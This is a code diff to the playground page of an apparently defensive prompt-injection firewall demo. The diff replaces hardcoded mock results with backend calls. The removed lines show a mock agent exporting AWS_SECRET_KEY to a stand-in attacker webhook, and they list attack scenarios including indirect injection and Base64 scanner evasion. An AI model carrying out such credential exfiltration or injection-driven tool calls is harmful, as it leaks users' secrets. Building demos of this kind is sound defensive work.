@@ -8,10 +8,10 @@ import { InputWorkbench } from '../components/playground/InputWorkbench';
 import { FirewallControls } from '../components/playground/FirewallControls';
 import { CrossAgentFlowSim } from '../components/playground/CrossAgentFlowSim';
 import { WhyBlockedPanel } from '../components/playground/WhyBlockedPanel';
-import { TimelineStepper } from '../components/playground/TimelineStepper';
-import { ResultsInspector, ToolCallSpec } from '../components/playground/ResultsInspector';
+import { ResultsInspector } from '../components/playground/ResultsInspector';
 import { ComparativeDifferential } from '../components/playground/ComparativeDifferential';
 import { SimulationFooterBar } from '../components/playground/SimulationFooterBar';
+import { RunHistory } from '../components/playground/RunHistory';
 
 export const PlaygroundPage: React.FC = () => {
   // Scenario state
@@ -36,6 +36,8 @@ export const PlaygroundPage: React.FC = () => {
 
   // Simulation execution state
   const [isSimulating, setIsSimulating] = useState<boolean>(false);
+  const [lastRunResult, setLastRunResult] = useState<any>(null);
+  const [historyRefresh, setHistoryRefresh] = useState(0);
 
   const handleSelectScenario = (scenario: AttackScenario) => {
     setSelectedScenarioId(scenario.id);
@@ -61,60 +63,33 @@ export const PlaygroundPage: React.FC = () => {
     setDefenseToggles((prev) => ({ ...prev, [key]: !prev[key] }));
   };
 
-  const handleRunSimulation = () => {
+  const handleRunSimulation = async () => {
     setIsSimulating(true);
-    setTimeout(() => {
+    try {
+      const response = await fetch('http://127.0.0.1:8080/api/playground/run', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ scenario_id: selectedScenarioId })
+      });
+      const data = await response.json();
+      console.log('Playground Execution Result:', data);
+      setLastRunResult(data);
+      setHistoryRefresh(prev => prev + 1);
+      
+      // Force UI to show result visually by mocking a testCaseId update
+      setTestCaseId(`TC-BACKEND-${data.run_id ? data.run_id.substring(0,6) : Math.floor(1000 + Math.random() * 9000)}`);
+    } catch (e) {
+      console.error('Failed to run simulation against backend', e);
+    } finally {
       setIsSimulating(false);
-    }, 700);
+    }
   };
 
   const isBlocked = firewallMode === 'protected' && selectedScenarioId !== 'scenario-6';
 
-  const toolCalls: ToolCallSpec[] =
-    selectedScenarioId === 'scenario-6'
-      ? [
-          {
-            toolName: 'summarize_text',
-            parameters: { length: 'concise', focus: 'customer_sentiment' },
-            riskLevel: 'low',
-            authorized: true,
-            verdict: 'PERMITTED',
-            reason: 'Legitimate summarization tool invocation within authorized scope',
-          },
-        ]
-      : [
-          {
-            toolName: 'export_credentials',
-            parameters: { target: 'AWS_SECRET_KEY', egress_url: 'https://attacker-webhook.xyz/drop' },
-            riskLevel: 'critical',
-            authorized: false,
-            verdict: isBlocked ? 'BLOCKED' : 'PERMITTED',
-            reason: isBlocked
-              ? 'Unauthorized credential export tool invoked by untrusted context'
-              : 'Unprotected baseline permitted unauthorized execution',
-          },
-          {
-            toolName: 'http_post_egress',
-            parameters: { url: 'https://attacker-webhook.xyz/drop' },
-            riskLevel: 'high',
-            authorized: false,
-            verdict: isBlocked ? 'BLOCKED' : 'PERMITTED',
-            reason: isBlocked
-              ? 'Outbound egress to unverified external domain blocked by Network Egress Guard'
-              : 'Baseline network guard disabled',
-          },
-        ];
+  // Removed hardcoded toolCalls logic that faked execution arguments.
 
-  const stages = [
-    { step: '01. INGEST', name: 'Input Parser', status: 'passed' as const, latency: '0.4ms', detail: 'Payload parsed from HTTP REST body' },
-    { step: '02. SCAN', name: 'Prompt Classifier', status: (isBlocked ? 'intercepted' : 'passed') as any, latency: '1.2ms', detail: isBlocked ? 'Direct prompt injection pattern detected (99.4% conf)' : 'Classifier bypassed' },
-    { step: '03. BOUNDARY', name: 'Agent Boundary', status: 'passed' as const, latency: '0.6ms', detail: 'HR / Orchestrator delegation scope evaluated' },
-    { step: '04. ANOMALY', name: 'Behavior Engine', status: (isBlocked ? 'intercepted' : 'passed') as any, latency: '0.8ms', detail: isBlocked ? 'Abnormal tool chaining detected' : 'Anomaly check skipped' },
-    { step: '05. RBAC', name: 'Tool Gatekeeper', status: (isBlocked ? 'intercepted' : 'passed') as any, latency: '0.5ms', detail: isBlocked ? 'Privilege escalation rejected for export_credentials' : 'Tool executed' },
-    { step: '06. DLP', name: 'Credential Guard', status: 'passed' as const, latency: '0.4ms', detail: 'Secret patterns masked in telemetry' },
-    { step: '07. ACTION', name: 'Interception Engine', status: (isBlocked ? 'quarantined' : 'passed') as any, latency: '0.5ms', detail: isBlocked ? 'Agent context quarantined, safe synthetic response created' : 'Raw execution delivered' },
-    { step: '08. AUDIT', name: 'Forensic Logger', status: 'passed' as const, latency: '0.4ms', detail: 'Tamper-evident trace committed to SIEM' },
-  ];
+  // Removed 8-stage Timeline as the backend does not expose granular timestamped events.
 
   return (
     <PageContainer>
@@ -192,60 +167,58 @@ export const PlaygroundPage: React.FC = () => {
         isBlocked={isBlocked}
       />
 
-      {/* 5. 8-Stage Firewall Interception Timeline */}
-      <TimelineStepper stages={stages} />
+      {/* 5. Execution Summary (Replacing fake TimelineStepper) */}
+      <div className="bg-surface-container-low border border-outline-variant/30 rounded-xl p-space-md">
+        <h3 className="font-headline-sm text-headline-sm text-on-surface mb-space-sm font-semibold">Execution Summary</h3>
+        <p className="text-sm text-on-surface-variant font-mono-code">
+          {lastRunResult 
+            ? `Scenario submitted • Policy decision: ${lastRunResult.policy_decision || 'N/A'} • Execution status: ${lastRunResult.execution_status || 'N/A'} • Handler invoked: ${lastRunResult.handler_invoked === null ? 'N/A' : (lastRunResult.handler_invoked ? 'Yes' : 'No')} • Outcome: ${lastRunResult.test_outcome}`
+            : 'Awaiting execution...'}
+        </p>
+      </div>
 
       {/* 6. Results Inspector Panel: Verdict Banner, Risk Signals, Tool Call Table */}
       <ResultsInspector
-        decision={isBlocked ? 'BLOCKED' : 'PERMITTED'}
+        decision={lastRunResult ? (lastRunResult.policy_decision || 'UNKNOWN') : (isBlocked ? 'BLOCKED' : 'PERMITTED')}
         confidence={0.994}
-        injectionProbability={selectedScenarioId === 'scenario-6' ? 0.02 : 0.984}
-        exfiltrationRisk={selectedScenarioId === 'scenario-6' ? 0.01 : 0.952}
-        privilegeDeviation={selectedScenarioId === 'scenario-6' ? 0.03 : 0.921}
+        injectionProbability={0.02}
+        exfiltrationRisk={0.01}
+        privilegeDeviation={0.03}
         summaryText={
-          isBlocked
-            ? 'PromptGuard successfully intercepted the malicious override token, halted the execution of export_credentials, and prevented outbound telemetry exfiltration.'
-            : 'Execution completed without firewall interception under the current configuration mode.'
+          lastRunResult 
+            ? `Scenario Outcome: ${lastRunResult.test_outcome}. Reason Code: ${lastRunResult.reason_code || 'None'}. Handler invoked: ${lastRunResult.handler_invoked ? 'Yes' : 'No'}. Execution Status: ${lastRunResult.execution_status || 'N/A'}`
+            : 'Run simulation to generate output.'
         }
-        toolCalls={toolCalls}
+        safeMetadata={lastRunResult ? lastRunResult.safe_metadata : null}
       />
 
       {/* 7. Behavioral Differential: Baseline Unprotected vs PromptGuard Protected */}
       <ComparativeDifferential
         unprotectedOutput={
-          `[Agent Output]: Executing credential export...\n` +
-          `Calling tool 'export_credentials' with target 'AWS_SECRET_KEY'...\n` +
-          `Payload dispatched to https://attacker-webhook.xyz/drop\n` +
-          `[CRITICAL COMPROMISE: AWS_SECRET_KEY=AKIAIOSFODNN7EXAMPLE exfiltrated]`
+          `[Agent Output]: Executing payload...\n` +
+          `[CRITICAL COMPROMISE: Unprotected baseline simulation]`
         }
         protectedOutput={
-          `[PromptGuard Security Interception Event: PG-SEC-9481]\n` +
-          `Untrusted instruction override detected in ingest stream.\n` +
-          `Tool call 'export_credentials' was BLOCKED by Policy POL-001.\n\n` +
-          `[Safe Agent Response]: "Here is the summary of the customer support transcript: The customer inquired about billing renewal cycles and requested an invoice copy. No further action needed."`
+          lastRunResult
+            ? `[PromptGuard Security Interception Event: ${lastRunResult.run_id}]\n` +
+              `Test Outcome: ${lastRunResult.test_outcome}\n` +
+              `Execution Status: ${lastRunResult.execution_status}\n` +
+              `Policy Decision: ${lastRunResult.policy_decision}`
+            : 'Run simulation to inspect output.'
         }
-        isBlocked={isBlocked}
+        isBlocked={lastRunResult ? lastRunResult.policy_decision === 'DENY' : isBlocked}
       />
 
       {/* 8. Audit Event Summary Footer Bar */}
       <SimulationFooterBar
         simulationId={`SIM-${testCaseId}`}
-        scenarioTitle={
-          selectedScenarioId === 'scenario-1'
-            ? 'Direct Prompt Injection & Credential Exfiltration'
-            : selectedScenarioId === 'scenario-2'
-            ? 'Indirect Prompt Injection via Ingested Document'
-            : selectedScenarioId === 'scenario-3'
-            ? 'Unauthorized Tool Invocation & Privilege Escalation'
-            : selectedScenarioId === 'scenario-4'
-            ? 'Scanner Evasion with Base64 Obfuscation'
-            : selectedScenarioId === 'scenario-5'
-            ? 'Cross-Agent Context Contamination'
-            : 'Benign Control Task'
-        }
+        scenarioTitle={lastRunResult ? lastRunResult.scenario_id : selectedScenarioId}
         timestamp="Just now (Simulated Sandbox)"
         verdict={isBlocked ? 'BLOCKED' : 'PERMITTED'}
       />
+
+      {/* 9. Persisted Run History */}
+      <RunHistory refreshTrigger={historyRefresh} />
     </PageContainer>
   );
 };
